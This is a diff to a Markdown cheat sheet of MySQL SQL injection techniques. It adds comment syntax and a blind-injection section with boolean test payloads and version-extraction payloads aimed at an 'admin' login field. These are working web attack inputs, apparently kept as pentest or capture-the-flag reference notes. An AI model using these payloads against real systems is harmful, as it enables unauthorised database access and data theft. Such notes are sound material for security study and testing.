@@ -1,7 +1,19 @@
 ## MySQL
 
-- Comment
+### Comment
   - `#`
+  - `-- `
+  - `/*comment*/`
+
+### Blind sqli
+  - Finding correct payload
+      - `admin' and (1=0)#` *return false*
+      - `admin' and (1=1)#` *return true*
+        
+  - Find version
+      - `admin' and (SELECT LENGTH(VERSION())=6)#`
+      - `admin' and (SELECT ASCII(SUBSTRING(VERSION(),1,1))=53)#`
+
 
 - Extract number column
 
